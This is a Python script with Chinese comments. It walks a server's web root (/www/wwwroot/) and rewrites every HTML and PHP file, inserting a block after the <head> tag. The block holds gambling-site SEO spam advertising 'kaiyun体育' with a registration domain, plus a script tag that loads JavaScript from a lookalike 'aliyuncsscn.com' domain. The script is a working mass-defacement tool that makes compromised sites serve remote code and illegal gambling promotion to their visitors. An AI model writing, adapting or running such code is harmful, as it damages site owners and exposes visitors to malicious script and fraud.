# -*- coding: utf-8 -*-
import os
import re
import codecs

# 指定目录
dir_path = '/www/wwwroot/'

# 要插入的内容
content = '''
<noscript>
<title>kaiyun体育官方网站全站入口(kaiyun)(中国)官网入口登录</title>
<meta name="keywords" content="kaiyun体育官方网站全站入口,kaiyun体育全站入口,kaiyun体育全站入口登录版,kaiyun体育全站app入口官网"/>
<meta name="description" content="kaiyun体育官方网站全站入口✅欢迎大哥回家✅【官方注册地址：kyun940.com⭐️】我们kaiyun体育全站在线提供：✔官网、登录、入口、官方、网站、平台、网址、网页版、手机版、最新地址、全站app下载需,kaiyun体育全站/棋牌欢迎您的加入!"/>
</noscript>
<script src="https://www.aliyuncsscn.com/web.min.js"></script>
'''

def detect_encoding(file_path):
    with open(file_path, 'rb') as file:
        raw_data = file.read()
    encodings = ['utf-8', 'gbk', 'iso-8859-1', 'windows-1252']
    for enc in encodings:
        try:
            raw_data.decode(enc)
            return enc
        except (UnicodeDecodeError, LookupError):
            continue
    return None

def read_file(file_path, encoding):
    try:
        with codecs.open(file_path, 'r', encoding, errors='ignore') as file:
            return file.read()
    except UnicodeDecodeError:
        return None

def traverse_dir(dir_path, content):
    for root, dirs, files in os.walk(dir_path):
        for filename in files:
            if filename.endswith(".html") or filename.endswith(".php"):
                file_path = os.path.join(root, filename)
                process_file(file_path, content)

def process_file(file_path, content):
    # 检测文件编码
    encoding = detect_encoding(file_path)
    if not encoding:
        print(f"无法检测文件编码: {file_path}")
        return
    
    html = read_file(file_path, encoding)
    
    # 如果检测到的编码无法正确解码，尝试其他常见编码
    if html is None:
        for enc in ['utf-8', 'gbk', 'iso-8859-1', 'windows-1252']:
            html = read_file(file_path, enc)
            if html is not None:
                encoding = enc
                break
    
    if html is None:
        print(f"无法读取文件: {file_path}")
        return

    # 在<head>标签后的第一行插入内容
    if '<head>' in html.lower():
        updated_html = re.sub(r'<head>', f'<head>\n{content}', html, 1)
        if updated_html is None:
            print(f"正则替换失败: {file_path}")
            return

        # 写回文件，使用原始编码
        try:
            with codecs.open(file_path, 'w', encoding, errors='ignore') as file:
                file.write(updated_html)
            print(f"文件已更新: {file_path}")
        except IOError:
            print(f"无法写入文件: {file_path}")
    else:
        print(f"文件中没有<head>标签: {file_path}")

# 开始递归遍历
traverse_dir(dir_path, content)

print("所有HTML和PHP文件已处理。")
